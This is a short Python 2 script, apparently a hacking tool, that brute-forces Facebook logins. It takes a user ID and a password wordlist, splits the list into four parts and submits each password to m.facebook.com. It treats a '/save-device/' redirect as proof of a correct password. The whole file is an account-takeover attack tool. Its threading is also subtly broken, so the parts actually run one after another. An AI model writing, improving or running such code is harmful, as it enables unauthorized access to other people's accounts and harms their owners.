#!/usr/bin/env python2
import os
from browser import Browser
import argparse
from colorama import *
import threading


parser = argparse.ArgumentParser()
parser.add_argument('-u', metavar="user_id", type=str, nargs="?")
parser.add_argument('-p', metavar="pass_dir", type=str, nargs="?")
args = parser.parse_args()

url = "https://m.facebook.com"


def login_bruteforce(username, wordlist):
    browser = Browser()
    for password in wordlist:
        try:
            password = password.strip("\n")
            response = browser.request_from(url, {'email': username, 'pass': password})
            verificatiion = "/save-device/" in response
            print(Fore.RED + "{0} => {1}: {2}".format(password, (verificatiion), response) + Fore.WHITE)
            if verificatiion:
                print(Fore.GREEN + "{0} => {1}".format(password, (verificatiion)) + Fore.WHITE)
                exit()
        except KeyboardInterrupt:
            print("Exit Programme !")
            exit()


def dived(wordlist):
    newpassword = []
    if os.path.exists(wordlist):
        with open(str(wordlist), "r") as wordlist_file:
            list_of_password = wordlist_file.readlines()
            ndiv = len(list_of_password) // 4
            backup = []
            i = 0
            for pwd in list_of_password:
                backup.append(pwd)
                i += 1
                if i == ndiv:
                    newpassword.append(backup)
                    # reset variable
                    backup = []
                    i = 0
    return newpassword


def hydra(username, wordlist):
    the_wordlist = dived(wordlist)
    [threading.Thread(login_bruteforce(username, wordlist_)).start() for wordlist_ in the_wordlist]


if __name__ == "__main__":
    hydra(args.u, args.p)

